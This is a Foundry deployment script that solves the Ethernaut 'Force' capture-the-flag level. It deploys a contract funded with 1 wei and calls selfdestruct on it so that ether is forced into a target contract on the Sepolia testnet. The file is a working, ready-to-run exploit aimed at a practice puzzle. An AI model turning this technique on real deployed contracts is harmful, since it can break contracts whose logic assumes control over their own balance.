// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

// Ethernaut Level 7: Force - Testnet Deployment Script
// This script deploys the exploit contract and executes the attack on Sepolia

contract ForceExploit {
    // Deploy with some ETH, then call destroy()
    function destroy(address payable target) external {
        selfdestruct(target); // Forces ETH to target regardless of their code
    }
    
    // Allow receiving ETH during deployment
    constructor() payable {}
}

contract ForceExploitScript is Script {
    // Sepolia Ethernaut Force instance (will be provided by Ethernaut when level started)
    // address public constant TARGET = 0x...; // Set after starting level
    
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address target = vm.envAddress("FORCE_TARGET");
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Step 1: Deploy exploit contract with 1 wei
        console.log("Deploying ForceExploit with 1 wei...");
        ForceExploit exploit = new ForceExploit{value: 1}();
        console.log("Exploit deployed at:", address(exploit));
        
        // Step 2: Execute selfdestruct to force ETH to target
        console.log("Executing selfdestruct to force ETH to target...");
        exploit.destroy(payable(target));
        console.log("Attack complete! Target balance should now be > 0");
        
        vm.stopBroadcast();
    }
}
